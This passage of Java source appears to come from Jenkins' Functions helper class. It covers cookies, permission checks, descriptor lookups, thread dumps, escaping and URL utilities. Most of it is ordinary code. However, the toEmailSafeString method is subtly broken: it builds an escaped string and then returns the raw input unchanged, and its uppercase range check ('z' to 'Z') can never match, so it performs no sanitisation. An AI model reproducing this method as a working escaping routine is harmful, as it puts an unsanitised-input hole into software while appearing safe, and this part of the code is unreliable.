Boolean.toString(refresh));\n            // Need to set path or it will not stick from e.g. a project page to the dashboard.\n            // Using request.getContextPath() might work but it seems simpler to just use the hudson_ prefix\n            // to avoid conflicts with any other web apps that might be on the same machine.\n            c.setPath(\"/\");\n            c.setMaxAge(60*60*24*30); // persist it roughly for a month\n            response.addCookie(c);\n        }\n        if (refresh) {\n            response.addHeader(\"Refresh\", System.getProperty(\"hudson.Functions.autoRefreshSeconds\", \"10\"));\n        }\n    }\n\n    public static boolean isAutoRefresh(HttpServletRequest request) {\n        String param = request.getParameter(\"auto_refresh\");\n        if (param != null) {\n            return Boolean.parseBoolean(param);\n        }\n        Cookie[] cookies = request.getCookies();\n        if(cookies==null)\n            return false; // when API design messes it up, we all suffer\n\n        for (Cookie c : cookies) {\n            if (c.getName().equals(\"hudson_auto_refresh\")) {\n                return Boolean.parseBoolean(c.getValue());\n            }\n        }\n        return false;\n    }\n\n    /**\n     * Finds the given object in the ancestor list and returns its URL.\n     * This is used to determine the \"current\" URL assigned to the given object,\n     * so that one can compute relative URLs from it.\n     */\n    public static String getNearestAncestorUrl(StaplerRequest req,Object it) {\n        List list = req.getAncestors();\n        for( int i=list.size()-1; i>=0; i-- ) {\n            Ancestor anc = (Ancestor) list.get(i);\n            if(anc.getObject()==it)\n                return anc.getUrl();\n        }\n        return null;\n    }\n\n    /**\n     * Finds the inner-most {@link SearchableModelObject} in scope.\n     */\n    public static String getSearchURL() {\n        List list = Stapler.getCurrentRequest().getAncestors();\n        for( int i=list.size()-1; i>=0; i-- ) {\n            Ancestor anc = (Ancestor) list.get(i);\n            if(anc.getObject() instanceof SearchableModelObject)\n                return anc.getUrl()+\"/search/\";\n        }\n        return null;\n    }\n\n    public static String appendSpaceIfNotNull(String n) {\n        if(n==null) return null;\n        else        return n+' ';\n    }\n\n    /**\n     * One nbsp per 10 pixels in given size, which may be a plain number or \"NxN\"\n     * (like an iconSize).  Useful in a sortable table heading.\n     */\n    public static String nbspIndent(String size) {\n        int i = size.indexOf('x');\n        i = Integer.parseInt(i > 0 ? size.substring(0, i) : size) / 10;\n        StringBuilder buf = new StringBuilder(30);\n        for (int j = 0; j < i; j++)\n            buf.append(\"&nbsp;\");\n        return buf.toString();\n    }\n\n    public static String getWin32ErrorMessage(IOException e) {\n        return Util.getWin32ErrorMessage(e);\n    }\n\n    public static boolean isMultiline(String s) {\n        if(s==null)     return false;\n        return s.indexOf('\\r')>=0 || s.indexOf('\\n')>=0;\n    }\n\n    public static String encode(String s) {\n        return Util.encode(s);\n    }\n\n    public static String escape(String s) {\n        return Util.escape(s);\n    }\n\n    public static String xmlEscape(String s) {\n        return Util.xmlEscape(s);\n    }\n\n    public static String xmlUnescape(String s) {\n        return s.replace(\"&lt;\",\"<\").replace(\"&gt;\",\">\").replace(\"&amp;\",\"&\");\n    }\n\n    public static String htmlAttributeEscape(String text) {\n        StringBuilder buf = new StringBuilder(text.length()+64);\n        for( int i=0; i<text.length(); i++ ) {\n            char ch = text.charAt(i);\n            if(ch=='<')\n                buf.append(\"&lt;\");\n            else\n            if(ch=='>')\n                buf.append(\"&gt;\");\n            else\n            if(ch=='&')\n                buf.append(\"&amp;\");\n            else\n            if(ch=='\"')\n                buf.append(\"&quot;\");\n            else\n            if(ch=='\\'')\n                buf.append(\"&#39;\");\n            else\n                buf.append(ch);\n        }\n        return buf.toString();\n    }\n\n    public static void checkPermission(Permission permission) throws IOException, ServletException {\n        checkPermission(Jenkins.getInstance(),permission);\n    }\n\n    public static void checkPermission(AccessControlled object, Permission permission) throws IOException, ServletException {\n        if (permission != null) {\n            object.checkPermission(permission);\n        }\n    }\n\n    /**\n     * This version is so that the 'checkPermission' on <tt>layout.jelly</tt>\n     * degrades gracefully if \"it\" is not an {@link AccessControlled} object.\n     * Otherwise it will perform no check and that problem is hard to notice.\n     */\n    public static void checkPermission(Object object, Permission permission) throws IOException, ServletException {\n        if (permission == null)\n            return;\n        \n        if (object instanceof AccessControlled)\n            checkPermission((AccessControlled) object,permission);\n        else {\n            List<Ancestor> ancs = Stapler.getCurrentRequest().getAncestors();\n            for(Ancestor anc : Iterators.reverse(ancs)) {\n                Object o = anc.getObject();\n                if (o instanceof AccessControlled) {\n                    checkPermission((AccessControlled) o,permission);\n                    return;\n                }\n            }\n            checkPermission(Jenkins.getInstance(),permission);\n        }\n    }\n\n    /**\n     * Returns true if the current user has the given permission.\n     *\n     * @param permission\n     *      If null, returns true. This defaulting is convenient in making the use of this method terse.\n     */\n    public static boolean hasPermission(Permission permission) throws IOException, ServletException {\n        return hasPermission(Jenkins.getInstance(),permission);\n    }\n\n    /**\n     * This version is so that the 'hasPermission' can degrade gracefully\n     * if \"it\" is not an {@link AccessControlled} object.\n     */\n    public static boolean hasPermission(Object object, Permission permission) throws IOException, ServletException {\n        if (permission == null)\n            return true;\n        if (object instanceof AccessControlled)\n            return ((AccessControlled)object).hasPermission(permission);\n        else {\n            List<Ancestor> ancs = Stapler.getCurrentRequest().getAncestors();\n            for(Ancestor anc : Iterators.reverse(ancs)) {\n                Object o = anc.getObject();\n                if (o instanceof AccessControlled) {\n                    return ((AccessControlled)o).hasPermission(permission);\n                }\n            }\n            return Jenkins.getInstance().hasPermission(permission);\n        }\n    }\n\n    public static void adminCheck(StaplerRequest req, StaplerResponse rsp, Object required, Permission permission) throws IOException, ServletException {\n        // this is legacy --- all views should be eventually converted to\n        // the permission based model.\n        if(required!=null && !Hudson.adminCheck(req, rsp)) {\n            // check failed. commit the FORBIDDEN response, then abort.\n            rsp.setStatus(HttpServletResponse.SC_FORBIDDEN);\n            rsp.getOutputStream().close();\n            throw new ServletException(\"Unauthorized access\");\n        }\n\n        // make sure the user owns the necessary permission to access this page.\n        if(permission!=null)\n            checkPermission(permission);\n    }\n\n    /**\n     * Infers the hudson installation URL from the given request.\n     */\n    public static String inferHudsonURL(StaplerRequest req) {\n        String rootUrl = Jenkins.getInstance().getRootUrl();\n        if(rootUrl !=null)\n            // prefer the one explicitly configured, to work with load-balancer, frontend, etc.\n            return rootUrl;\n        StringBuilder buf = new StringBuilder();\n        buf.append(req.getScheme()).append(\"://\");\n        buf.append(req.getServerName());\n        if(! (req.getScheme().equals(\"http\") && req.getLocalPort()==80 || req.getScheme().equals(\"https\") && req.getLocalPort()==443))\n            buf.append(':').append(req.getLocalPort());\n        buf.append(req.getContextPath()).append('/');\n        return buf.toString();\n    }\n\n    /**\n     * Returns the link to be displayed in the footer of the UI.\n     */\n    public static String getFooterURL() {\n        if(footerURL == null) {\n            footerURL = System.getProperty(\"hudson.footerURL\");\n            if(StringUtils.isBlank(footerURL)) {\n                footerURL = \"http://jenkins-ci.org/\";\n            }\n        }\n        return footerURL;\n    }\n    private static String footerURL = null;\n\n    public static List<JobPropertyDescriptor> getJobPropertyDescriptors(Class<? extends Job> clazz) {\n        return JobPropertyDescriptor.getPropertyDescriptors(clazz);\n    }\n\n    public static List<Descriptor<BuildWrapper>> getBuildWrapperDescriptors(AbstractProject<?,?> project) {\n        return BuildWrappers.getFor(project);\n    }\n\n    public static List<Descriptor<SecurityRealm>> getSecurityRealmDescriptors() {\n        return SecurityRealm.all();\n    }\n\n    public static List<Descriptor<AuthorizationStrategy>> getAuthorizationStrategyDescriptors() {\n        return AuthorizationStrategy.all();\n    }\n\n    public static List<Descriptor<Builder>> getBuilderDescriptors(AbstractProject<?,?> project) {\n        return BuildStepDescriptor.filter(Builder.all(), project.getClass());\n    }\n\n    public static List<Descriptor<Publisher>> getPublisherDescriptors(AbstractProject<?,?> project) {\n        return BuildStepDescriptor.filter(Publisher.all(), project.getClass());\n    }\n\n    public static List<SCMDescriptor<?>> getSCMDescriptors(AbstractProject<?,?> project) {\n        return SCM._for(project);\n    }\n\n    public static List<Descriptor<ComputerLauncher>> getComputerLauncherDescriptors() {\n        return Jenkins.getInstance().<ComputerLauncher,Descriptor<ComputerLauncher>>getDescriptorList(ComputerLauncher.class);\n    }\n\n    public static List<Descriptor<RetentionStrategy<?>>> getRetentionStrategyDescriptors() {\n        return RetentionStrategy.all();\n    }\n\n    public static List<ParameterDescriptor> getParameterDescriptors() {\n        return ParameterDefinition.all();\n    }\n\n    public static List<Descriptor<CaptchaSupport>> getCaptchaSupportDescriptors() {\n        return CaptchaSupport.all();\n    }\n\n    public static List<Descriptor<ViewsTabBar>> getViewsTabBarDescriptors() {\n        return ViewsTabBar.all();\n    }\n\n    public static List<Descriptor<MyViewsTabBar>> getMyViewsTabBarDescriptors() {\n        return MyViewsTabBar.all();\n    }\n\n    public static List<NodePropertyDescriptor> getNodePropertyDescriptors(Class<? extends Node> clazz) {\n        List<NodePropertyDescriptor> result = new ArrayList<NodePropertyDescriptor>();\n        Collection<NodePropertyDescriptor> list = (Collection) Jenkins.getInstance().getDescriptorList(NodeProperty.class);\n        for (NodePropertyDescriptor npd : list) {\n            if (npd.isApplicable(clazz)) {\n                result.add(npd);\n            }\n        }\n        return result;\n    }\n\n    /**\n     * Gets all the descriptors sorted by their inheritance tree of {@link Describable}\n     * so that descriptors of similar types come nearby.\n     *\n     * <p>\n     * We sort them by {@link Extension#ordinal()} but only for {@link GlobalConfiguration}s,\n     * as the value is normally used to compare similar kinds of extensions, and we needed\n     * {@link GlobalConfiguration}s to be able to position themselves in a layer above.\n     * This however creates some asymmetry between regular {@link Descriptor}s and {@link GlobalConfiguration}s.\n     * Perhaps it is better to introduce another annotation element? But then,\n     * extensions shouldn't normally concern themselves about ordering too much, and the only reason\n     * we needed this for {@link GlobalConfiguration}s are for backward compatibility.\n     *\n     * @param predicate\n     *      Filter the descriptors based on {@link GlobalConfigurationCategory}\n     * @since 1.494\n     */\n    public static Collection<Descriptor> getSortedDescriptorsForGlobalConfig(Predicate<GlobalConfigurationCategory> predicate) {\n        ExtensionList<Descriptor> exts = Jenkins.getInstance().getExtensionList(Descriptor.class);\n        List<Tag> r = new ArrayList<Tag>(exts.size());\n\n        for (ExtensionComponent<Descriptor> c : exts.getComponents()) {\n            Descriptor d = c.getInstance();\n            if (d.getGlobalConfigPage()==null)  continue;\n\n            if (d instanceof GlobalConfiguration) {\n                if (predicate.apply(((GlobalConfiguration)d).getCategory()))\n                    r.add(new Tag(c.ordinal(), d));\n            } else {\n                if (predicate.apply(GlobalConfigurationCategory.get(Unclassified.class)))\n                    r.add(new Tag(0, d));\n            }\n        }\n        Collections.sort(r);\n\n        List<Descriptor> answer = new ArrayList<Descriptor>(r.size());\n        for (Tag d : r) answer.add(d.d);\n\n        return DescriptorVisibilityFilter.apply(Jenkins.getInstance(),answer);\n    }\n\n    /**\n     * Like {@link #getSortedDescriptorsForGlobalConfig(Predicate)} but with a constant truth predicate, to include all descriptors.\n     */\n    public static Collection<Descriptor> getSortedDescriptorsForGlobalConfig() {\n        return getSortedDescriptorsForGlobalConfig(Predicates.<GlobalConfigurationCategory>alwaysTrue());\n    }\n\n    /**\n     * @deprecated This is rather meaningless.\n     */\n    @Deprecated\n    public static Collection<Descriptor> getSortedDescriptorsForGlobalConfigNoSecurity() {\n        return getSortedDescriptorsForGlobalConfig(Predicates.not(GlobalSecurityConfiguration.FILTER));\n    }\n\n    /**\n     * Like {@link #getSortedDescriptorsForGlobalConfig(Predicate)} but for unclassified descriptors only.\n     * @since 1.506\n     */\n    public static Collection<Descriptor> getSortedDescriptorsForGlobalConfigUnclassified() {\n        return getSortedDescriptorsForGlobalConfig(new Predicate<GlobalConfigurationCategory>() {\n            public boolean apply(GlobalConfigurationCategory cat) {\n                return cat instanceof GlobalConfigurationCategory.Unclassified;\n            }\n        });\n    }\n    \n    private static class Tag implements Comparable<Tag> {\n        double ordinal;\n        String hierarchy;\n        Descriptor d;\n\n        Tag(double ordinal, Descriptor d) {\n            this.ordinal = ordinal;\n            this.d = d;\n            this.hierarchy = buildSuperclassHierarchy(d.clazz, new StringBuilder()).toString();\n        }\n\n        private StringBuilder buildSuperclassHierarchy(Class c, StringBuilder buf) {\n            Class sc = c.getSuperclass();\n            if (sc!=null)   buildSuperclassHierarchy(sc,buf).append(':');\n            return buf.append(c.getName());\n        }\n\n        public int compareTo(Tag that) {\n            int r = Double.compare(this.ordinal, that.ordinal);\n            if (r!=0)   return -r; // descending for ordinal\n            return this.hierarchy.compareTo(that.hierarchy);\n        }\n    }\n    /**\n     * Computes the path to the icon of the given action\n     * from the context path.\n     */\n    public static String getIconFilePath(Action a) {\n        String name = a.getIconFileName();\n        if (name==null)     return null;\n        if (name.startsWith(\"/\"))\n            return name.substring(1);\n        else\n            return \"images/24x24/\"+name;\n    }\n\n    /**\n     * Works like JSTL build-in size(x) function,\n     * but handle null gracefully.\n     */\n    public static int size2(Object o) throws Exception {\n        if(o==null) return 0;\n        return ASTSizeFunction.sizeOf(o,Introspector.getUberspect());\n    }\n\n    /**\n     * Computes the relative path from the current page to the given item.\n     */\n    public static String getRelativeLinkTo(Item p) {\n        Map<Object,String> ancestors = new HashMap<Object,String>();\n        View view=null;\n\n        StaplerRequest request = Stapler.getCurrentRequest();\n        for( Ancestor a : request.getAncestors() ) {\n            ancestors.put(a.getObject(),a.getRelativePath());\n            if(a.getObject() instanceof View)\n                view = (View) a.getObject();\n        }\n\n        String path = ancestors.get(p);\n        if(path!=null)  return path;\n\n        Item i=p;\n        String url = \"\";\n        while(true) {\n            ItemGroup ig = i.getParent();\n            url = i.getShortUrl()+url;\n\n            if(ig== Jenkins.getInstance()) {\n                assert i instanceof TopLevelItem;\n                if(view!=null && view.contains((TopLevelItem)i)) {\n                    // if p and the current page belongs to the same view, then return a relative path\n                    return ancestors.get(view)+'/'+url;\n                } else {\n                    // otherwise return a path from the root Hudson\n                    return request.getContextPath()+'/'+p.getUrl();\n                }\n            }\n\n            path = ancestors.get(ig);\n            if(path!=null)  return path+'/'+url;\n\n            assert ig instanceof Item; // if not, ig must have been the Hudson instance\n            i = (Item) ig;\n        }\n    }\n\n    public static Map<Thread,StackTraceElement[]> dumpAllThreads() {\n        Map<Thread,StackTraceElement[]> sorted = new TreeMap<Thread,StackTraceElement[]>(new ThreadSorter());\n        sorted.putAll(Thread.getAllStackTraces());\n        return sorted;\n    }\n\n    @IgnoreJRERequirement\n    public static ThreadInfo[] getThreadInfos() {\n        ThreadMXBean mbean = ManagementFactory.getThreadMXBean();\n        return mbean.dumpAllThreads(mbean.isObjectMonitorUsageSupported(),mbean.isSynchronizerUsageSupported());\n    }\n\n    public static ThreadGroupMap sortThreadsAndGetGroupMap(ThreadInfo[] list) {\n        ThreadGroupMap sorter = new ThreadGroupMap();\n        Arrays.sort(list, sorter);\n        return sorter;\n    }\n\n    // Common code for sorting Threads/ThreadInfos by ThreadGroup\n    private static class ThreadSorterBase {\n        protected Map<Long,String> map = new HashMap<Long,String>();\n\n        private ThreadSorterBase() {\n            ThreadGroup tg = Thread.currentThread().getThreadGroup();\n            while (tg.getParent() != null) tg = tg.getParent();\n            Thread[] threads = new Thread[tg.activeCount()*2];\n            int threadsLen = tg.enumerate(threads, true);\n            for (int i = 0; i < threadsLen; i++)\n                map.put(threads[i].getId(), threads[i].getThreadGroup().getName());\n        }\n\n        protected int compare(long idA, long idB) {\n            String tga = map.get(idA), tgb = map.get(idB);\n            int result = (tga!=null?-1:0) + (tgb!=null?1:0);  // Will be non-zero if only one is null\n            if (result==0 && tga!=null)\n                result = tga.compareToIgnoreCase(tgb);\n            return result;\n        }\n    }\n\n    public static class ThreadGroupMap extends ThreadSorterBase implements Comparator<ThreadInfo> {\n\n        /**\n         * @return ThreadGroup name or null if unknown\n         */\n        public String getThreadGroup(ThreadInfo ti) {\n            return map.get(ti.getThreadId());\n        }\n\n        public int compare(ThreadInfo a, ThreadInfo b) {\n            int result = compare(a.getThreadId(), b.getThreadId());\n            if (result == 0)\n                result = a.getThreadName().compareToIgnoreCase(b.getThreadName());\n            return result;\n        }\n    }\n\n    private static class ThreadSorter extends ThreadSorterBase implements Comparator<Thread> {\n\n        public int compare(Thread a, Thread b) {\n            int result = compare(a.getId(), b.getId());\n            if (result == 0)\n                result = a.getName().compareToIgnoreCase(b.getName());\n            return result;\n        }\n    }\n\n    /**\n     * Are we running on JRE6 or above?\n     */\n    @IgnoreJRERequirement\n    public static boolean isMustangOrAbove() {\n        try {\n            System.console();\n            return true;\n        } catch(LinkageError e) {\n            return false;\n        }\n    }\n\n    // ThreadInfo.toString() truncates the stack trace by first 8, so needed my own version\n    @IgnoreJRERequirement\n    public static String dumpThreadInfo(ThreadInfo ti, ThreadGroupMap map) {\n        String grp = map.getThreadGroup(ti);\n        StringBuilder sb = new StringBuilder(\"\\\"\" + ti.getThreadName() + \"\\\"\" +\n                                             \" Id=\" + ti.getThreadId() + \" Group=\" +\n                                             (grp != null ? grp : \"?\") + \" \" +\n                                             ti.getThreadState());\n        if (ti.getLockName() != null) {\n            sb.append(\" on \" + ti.getLockName());\n        }\n        if (ti.getLockOwnerName() != null) {\n            sb.append(\" owned by \\\"\" + ti.getLockOwnerName() +\n                      \"\\\" Id=\" + ti.getLockOwnerId());\n        }\n        if (ti.isSuspended()) {\n            sb.append(\" (suspended)\");\n        }\n        if (ti.isInNative()) {\n            sb.append(\" (in native)\");\n        }\n        sb.append('\\n');\n        StackTraceElement[] stackTrace = ti.getStackTrace();\n        for (int i=0; i < stackTrace.length; i++) {\n            StackTraceElement ste = stackTrace[i];\n            sb.append(\"\\tat \" + ste.toString());\n            sb.append('\\n');\n            if (i == 0 && ti.getLockInfo() != null) {\n                Thread.State ts = ti.getThreadState();\n                switch (ts) {\n                    case BLOCKED:\n                        sb.append(\"\\t-  blocked on \" + ti.getLockInfo());\n                        sb.append('\\n');\n                        break;\n                    case WAITING:\n                        sb.append(\"\\t-  waiting on \" + ti.getLockInfo());\n                        sb.append('\\n');\n                        break;\n                    case TIMED_WAITING:\n                        sb.append(\"\\t-  waiting on \" + ti.getLockInfo());\n                        sb.append('\\n');\n                        break;\n                    default:\n                }\n            }\n\n            for (MonitorInfo mi : ti.getLockedMonitors()) {\n                if (mi.getLockedStackDepth() == i) {\n                    sb.append(\"\\t-  locked \" + mi);\n                    sb.append('\\n');\n                }\n            }\n       }\n\n       LockInfo[] locks = ti.getLockedSynchronizers();\n       if (locks.length > 0) {\n           sb.append(\"\\n\\tNumber of locked synchronizers = \" + locks.length);\n           sb.append('\\n');\n           for (LockInfo li : locks) {\n               sb.append(\"\\t- \" + li);\n               sb.append('\\n');\n           }\n       }\n       sb.append('\\n');\n       return sb.toString();\n    }\n\n    public static <T> Collection<T> emptyList() {\n        return Collections.emptyList();\n    }\n\n    public static String jsStringEscape(String s) {\n        StringBuilder buf = new StringBuilder();\n        for( int i=0; i<s.length(); i++ ) {\n            char ch = s.charAt(i);\n            switch(ch) {\n            case '\\'':\n                buf.append(\"\\\\'\");\n                break;\n            case '\\\\':\n                buf.append(\"\\\\\\\\\");\n                break;\n            case '\"':\n                buf.append(\"\\\\\\\"\");\n                break;\n            default:\n                buf.append(ch);\n            }\n        }\n        return buf.toString();\n    }\n\n    /**\n     * Converts \"abc\" to \"Abc\".\n     */\n    public static String capitalize(String s) {\n        if(s==null || s.length()==0) return s;\n        return Character.toUpperCase(s.charAt(0))+s.substring(1);\n    }\n\n    public static String getVersion() {\n        return Jenkins.VERSION;\n    }\n\n    /**\n     * Resoruce path prefix.\n     */\n    public static String getResourcePath() {\n        return Jenkins.RESOURCE_PATH;\n    }\n\n    public static String getViewResource(Object it, String path) {\n        Class clazz = it.getClass();\n\n        if(it instanceof Class)\n            clazz = (Class)it;\n        if(it instanceof Descriptor)\n            clazz = ((Descriptor)it).clazz;\n\n        StringBuilder buf = new StringBuilder(Stapler.getCurrentRequest().getContextPath());\n        buf.append(Jenkins.VIEW_RESOURCE_PATH).append('/');\n        buf.append(clazz.getName().replace('.','/').replace('$','/'));\n        buf.append('/').append(path);\n\n        return buf.toString();\n    }\n\n    public static boolean hasView(Object it, String path) throws IOException {\n        if(it==null)    return false;\n        return Stapler.getCurrentRequest().getView(it,path)!=null;\n    }\n\n    /**\n     * Can be used to check a checkbox by default.\n     * Used from views like {@code h.defaultToTrue(scm.useUpdate)}.\n     * The expression will evaluate to true if scm is null.\n     */\n    public static boolean defaultToTrue(Boolean b) {\n        if(b==null) return true;\n        return b;\n    }\n\n    /**\n     * If the value exists, return that value. Otherwise return the default value.\n     * <p>\n     * Starting 1.294, JEXL supports the elvis operator \"x?:y\" that supercedes this.\n     *\n     * @since 1.150\n     */\n    public static <T> T defaulted(T value, T defaultValue) {\n        return value!=null ? value : defaultValue;\n    }\n\n    public static String printThrowable(Throwable t) {\n        StringWriter sw = new StringWriter();\n        t.printStackTrace(new PrintWriter(sw));\n        return sw.toString();\n    }\n\n    /**\n     * Counts the number of rows needed for textarea to fit the content.\n     * Minimum 5 rows.\n     */\n    public static int determineRows(String s) {\n        if(s==null)     return 5;\n        return Math.max(5,LINE_END.split(s).length);\n    }\n\n    /**\n     * Converts the Hudson build status to CruiseControl build status,\n     * which is either Success, Failure, Exception, or Unknown.\n     */\n    public static String toCCStatus(Item i) {\n        if (i instanceof Job) {\n            Job j = (Job) i;\n            switch (j.getIconColor().noAnime()) {\n            case ABORTED:\n            case RED:\n            case YELLOW:\n                return \"Failure\";\n            case BLUE:\n                return \"Success\";\n            case DISABLED:\n            case GREY:\n                return \"Unknown\";\n            }\n        }\n        return \"Unknown\";\n    }\n\n    private static final Pattern LINE_END = Pattern.compile(\"\\r?\\n\");\n\n    /**\n     * Checks if the current user is anonymous.\n     */\n    public static boolean isAnonymous() {\n        return Jenkins.getAuthentication() instanceof AnonymousAuthenticationToken;\n    }\n\n    /**\n     * When called from within JEXL expression evaluation,\n     * this method returns the current {@link JellyContext} used\n     * to evaluate the script.\n     *\n     * @since 1.164\n     */\n    public static JellyContext getCurrentJellyContext() {\n        JellyContext context = ExpressionFactory2.CURRENT_CONTEXT.get();\n        assert context!=null;\n        return context;\n    }\n\n    /**\n     * Evaluate a Jelly script and return output as a String.\n     *\n     * @since 1.267\n     */\n    public static String runScript(Script script) throws JellyTagException {\n        StringWriter out = new StringWriter();\n        script.run(getCurrentJellyContext(), XMLOutput.createXMLOutput(out));\n        return out.toString();\n    }\n\n    /**\n     * Returns a sub-list if the given list is bigger than the specified 'maxSize'\n     */\n    public static <T> List<T> subList(List<T> base, int maxSize) {\n        if(maxSize<base.size())\n            return base.subList(0,maxSize);\n        else\n            return base;\n    }\n\n    /**\n     * Combine path components via '/' while handling leading/trailing '/' to avoid duplicates.\n     */\n    public static String joinPath(String... components) {\n        StringBuilder buf = new StringBuilder();\n        for (String s : components) {\n            if (s.length()==0)  continue;\n\n            if (buf.length()>0) {\n                if (buf.charAt(buf.length()-1)!='/')\n                    buf.append('/');\n                if (s.charAt(0)=='/')   s=s.substring(1);\n            }\n            buf.append(s);\n        }\n        return buf.toString();\n    }\n\n    /**\n     * Computes the hyperlink to actions, to handle the situation when the {@link Action#getUrlName()}\n     * returns absolute URL.\n     */\n    public static String getActionUrl(String itUrl,Action action) {\n        String urlName = action.getUrlName();\n        if(urlName==null)   return null;    // to avoid NPE and fail to render the whole page\n        try {\n            if (new URI(urlName).isAbsolute()) {\n                return urlName;\n            }\n        } catch (URISyntaxException x) {\n            Logger.getLogger(Functions.class.getName()).log(Level.WARNING, \"Failed to parse URL for {0}: {1}\", new Object[] {action, x});\n            return null;\n        }\n        if(urlName.startsWith(\"/\"))\n            return joinPath(Stapler.getCurrentRequest().getContextPath(),urlName);\n        else\n            // relative URL name\n            return joinPath(Stapler.getCurrentRequest().getContextPath()+'/'+itUrl,urlName);\n    }\n\n    /**\n     * Escapes the character unsafe for e-mail address.\n     * See http://en.wikipedia.org/wiki/E-mail_address for the details,\n     * but here the vocabulary is even more restricted.\n     */\n    public static String toEmailSafeString(String projectName) {\n        // TODO: escape non-ASCII characters\n        StringBuilder buf = new StringBuilder(projectName.length());\n        for( int i=0; i<projectName.length(); i++ ) {\n            char ch = projectName.charAt(i);\n            if(('a'<=ch && ch<='z')\n            || ('z'<=ch && ch<='Z')\n            || ('0'<=ch && ch<='9')\n            || \"-_.\".indexOf(ch)>=0)\n                buf.append(ch);\n            else\n                buf.append('_');    // escape\n        }\n        return projectName;\n    }\n\n    public String getSystemProperty(String key) {\n        return System.getProperty(key);\n    }\n\n    /**\n     * Obtains the host name of the Hudson server that clients can use to talk back to.\n     * <p>\n     * This is primarily used in <tt>slave-agent.jnlp.jelly</tt> to specify the destination\n     * that the slaves talk to.\n     */\n    public String getServerName() {\n        // Try to infer this from the configured root URL.\n        // This makes it work correctly when Hudson runs behind a reverse proxy.\n        String url = Jenkins.getInstance().getRootUrl();\n        try {\n            if(url!=null) {\n                String host = new URL(url).getHost();\n                if(host!=null)\n                    return host;\n            }\n        } catch (MalformedURLException e) {\n            // fall back to HTTP request\n        }\n        return Stapler.getCurrentRequest().getServerName();\n    }\n\n    /**\n     * Determines the form validation check URL. See textbox.jelly\n     */\n    public String getCheckUrl(String userDefined, Object descriptor, String field) {\n        if(userDefined!=null || field==null)   return userDefined;\n        if (descriptor instanceof Descriptor) {\n            Descriptor d = (Descriptor) descriptor;\n            return d.getCheckUrl(field);\n        }\n        return null;\n    }\n\n    /**\n     * If the given href link is matching the current page, return true.\n     *\n     * Used in <tt>task.jelly</tt> to decide if the page should be highlighted.\n     */\n    public boolean hyperlinkMatchesCurrentPage(String href) throws UnsupportedEncodingException {\n        String url = Stapler.getCurrentRequest().getRequestURL().toString();\n        if (href == null || href.length() <= 1) return \".\".equals(href) && url.endsWith(\"/\");\n        url = URLDecoder.decode(url,\"UTF-8\");\n        href = URLDecoder.decode(href,\"UTF-8\");\n        if (url.endsWith(\"/\")) url = url.substring(0, url.length() - 1);\n        if (href.endsWith(\"/\")) href = href.substring(0, href.length() - 1);\n\n        return url.endsWith(href);\n    }\n\n    public <T> List<T> singletonList(T t) {\n        return Collections.singletonList(t);\n    }\n\n    /**\n     * Gets all the {@link PageDecorator}s.\n     */\n    public static List<PageDecorator> getPageDecorators() {\n        // this method may be called to render start up errors, at which point Hudson doesn't exist yet. see HUDSON-3608 \n        if(Jenkins.getInstance()==null)  return Collections.emptyList();\n        return PageDecorator.all();\n    }\n    \n    public static List<Descriptor<Cloud>> getCloudDescriptors() {\n        return Cloud.all();\n    }\n\n    /**\n     * Prepend a prefix only when there's the specified body.\n     */\n    public String prepend(String prefix, String body) {\n        if(body!=null && body.length()>0)\n            return prefix+body;\n        return body;\n    }\n\n    public static List<Descriptor<CrumbIssuer>> getCrumbIssuerDescriptors() {\n        return CrumbIssuer.all();\n    }\n\n    public static String getCrumb(StaplerRequest req) {\n        Jenkins h = Jenkins.getInstance();\n        CrumbIssuer issuer = h != null ? h.getCrumbIssuer() : null;\n        return issuer != null ? issuer.getCrumb(req) : \"\";\n    }\n\n    public static String getCrumbRequestField() {\n        Jenkins h = Jenkins.getInstance();\n        CrumbIssuer issuer = h != null ? h.getCrumbIssuer() : null;\n        return issuer != null ? issuer.getDescriptor().getCrumbRequestField() : \"\";\n    }\n\n    public static Date getCurrentTime() {\n        return new Date();\n    }\n\n    public static Locale getCurrentLocale() {\n        Locale locale=null;\n        StaplerRequest req = Stapler.getCurrentRequest();\n        if(req!=null)\n            locale = req.getLocale();\n        if(locale==null)\n            locale = Locale.getDefault();\n        return locale;\n    }\n\n    /**\n     * Generate a series of &lt;script> tags to include <tt>script.js</tt>\n     * from {@link ConsoleAnnotatorFactory}s and {@link ConsoleAnnotationDescriptor}s.\n     */\n    public static String generateConsoleAnnotationScriptAndStylesheet() {\n        String cp = Stapler.getCurrentRequest().getContextPath();\n        StringBuilder buf = new StringBuilder();\n        for (ConsoleAnnotatorFactory f : ConsoleAnnotatorFactory.all()) {\n            String path = cp + \"/extensionList/\" + ConsoleAnnotatorFactory.class.getName() + \"/\" + f.getClass().getName();\n            if (f.hasScript())\n                buf.append(\"<script src='\"+path+\"/script.js'></script>\");\n            if (f.hasStylesheet())\n                buf.append(\"<link rel='stylesheet' type='text/css' href='\"+path+\"/style.css' />\");\n        }\n        for (ConsoleAnnotationDescriptor d : ConsoleAnnotationDescriptor.all()) {\n            String path = cp+\"/descriptor/\"+d.clazz.getName();\n            if (d.hasScript())\n                buf.append(\"<script src='\"+path+\"/script.js'></script>\");\n            if (d.hasStylesheet())\n                buf.append(\"<link rel='stylesheet' type='text/css' href='\"+path+\"/style.css' />\");\n        }\n        return buf.toString();\n    }\n\n    /**\n     * Work around for bug 6935026.\n     */\n    public List<String> getLoggerNames() {\n        while (true) {\n            try {\n                List<String> r = new ArrayList<String>();\n                Enumeration<String> e = LogManager.getLogManager().getLoggerNames();\n                while (e.hasMoreElements())\n                    r.add(e.nextElement());\n                return r;\n            } catch (ConcurrentModificationException e) {\n                // retry\n            }\n        }\n    }\n\n    /**\n     * Used by &lt;f:password/> so that we send an encrypted value to the client.\n     */\n    public String getPasswordValue(Object o) {\n        if (o==null)    return null;\n        if (o instanceof Secret)    return ((Secret)o).getEncryptedValue();\n        return o.toString();\n    }\n\n    public List filterDescriptors(Object context, Iterable descriptors) {\n        return DescriptorVisibilityFilter.apply(context,descriptors);\n    }\n    \n    /**\n     * Returns true if we are running unit tests.\n     */\n    public static boolean getIsUnitTest() {\n        return Main.isUnitTest;\n    }\n\n    /**\n     * Returns {@code true} if the {@link Run#ARTIFACTS} permission is enabled,\n     * {@code false} otherwise.\n     *\n     * <p>When the {@link Run#ARTIFACTS} permission is not turned on using the\n     * {@code hudson.security.ArtifactsPermission} system property, this\n     * permission must not be considered to be set to {@code false} for every\n     * user. It must rather be like if the permission doesn't exist at all\n     * (which means that every user has to have an access to the artifacts but\n     * the permission can't be configured in the security screen). Got it?</p>\n     */\n    public static boolean isArtifactsPermissionEnabled() {\n        return 